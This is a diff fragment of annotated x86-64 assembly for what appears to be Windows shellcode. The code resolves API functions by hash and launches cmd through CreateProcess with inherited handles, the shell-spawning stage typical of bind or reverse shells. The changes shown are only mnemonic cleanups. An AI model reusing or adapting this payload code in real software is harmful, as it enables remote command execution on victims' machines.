@@ -87,10 +87,10 @@ _hash_finished:
     /* 5a                */  pop    %rdx
     /* 59                */  pop    %rcx
     /* 5d                */  pop    %rbp
-    /* ff e0             */  jmpq   *%rax                   /* Jump to found function */
+    /* ff e0             */  jmp    *%rax                   /* Jump to found function */
 
 start:
-    /* 68 01 63 6d 64    */  pushq  $0x646d6301             /* Push "\x01cmd" */
+    /* 68 01 63 6d 64    */  push   $0x646d6301             /* Push "\x01cmd" */
     /* 54                */  push   %rsp
     /* 5a                */  pop    %rdx                    /* args(lpCommandLine) = rsp */
     /* c1 2a 08          */  shrl   $0x8, (%rdx)            /* Shift the command line letters */
@@ -109,15 +109,15 @@ start:
     /* 48 83 ef 18       */  sub    $0x18, %rdi             /* rdi = &PROCESS_INFORMATION */
     /* 41 58             */  pop    %r8                     /* args(lpProcessAttributes) = NULL */
     /* 41 59             */  pop    %r9                     /* args(lpThreadAttributes) = NULL */
-    /* 6a 68             */  pushq  $0x68                   /* STARTUPINFO.cbSize = 104 */
+    /* 6a 68             */  push   $0x68                   /* STARTUPINFO.cbSize = 104 */
     /* 54                */  push   %rsp
     /* 5e                */  pop    %rsi
     /* 57                */  push   %rdi                    /* args(lpProcessInformation) = rdi */
     /* 56                */  push   %rsi                    /* args(lpStartupInfo) = &STARTUPINFO */
     /* 51                */  push   %rcx                    /* args(lpCurrentDirectory) = NULL */
     /* 51                */  push   %rcx                    /* args(lpEnvironment) = NULL */
-    /* 6a 10             */  pushq  $0x10                   /* args(dwCreationFlags) = CREATE_NEW_CONSOLE */
-    /* 6a 01             */  pushq  $0x1                    /* args(bInheritHandles) = TRUE */
+    /* 6a 10             */  push   $0x10                   /* args(dwCreationFlags) = CREATE_NEW_CONSOLE */
+    /* 6a 01             */  push   $0x1                    /* args(bInheritHandles) = TRUE */
     /* 51                */  push   %rcx
     /* 51                */  push   %rcx
     /* 51                */  push   %rcx
@@ -133,13 +133,13 @@ start:
                                                             /*     0x38(%rsp): lpCurrentDirectory */
                                                             /*     0x40(%rsp): lpStartupInfo */
                                                             /*     0x48(%rsp): lpProcessInformation */
-    /* e8 45 ff ff ff    */  callq  call_by_hash            /* ) */
-    /* 6a ff             */  pushq  $0xffffffffffffffff
+    /* e8 45 ff ff ff    */  call   call_by_hash            /* ) */
+    /* 6a ff             */  push   $0xffffffffffffffff
     /* 5a                */  pop    %rdx                    /* args(dwMilliseconds) = INFINITE */
     /* 48 8b 0f          */  mov    (%rdi), %rcx            /* args(hHandle) = hProcess */
     /* bb 76 51 94 d8    */  mov    $0xd8945176, %ebx       /* Call WaitForSingleObject */
 _exit_loop:
-    /* e8 35 ff ff ff    */  callq  call_by_hash
+    /* e8 35 ff ff ff    */  call   call_by_hash
     /* 31 c9             */  xor    %ecx, %ecx              /* args(uExitCode) = 0 */
     /* bb d5 a5 c9 42    */  mov    $0x42c9a5d5, %ebx       /* Call ExitProcess */
     /* eb f2             */  jmp    _exit_loop
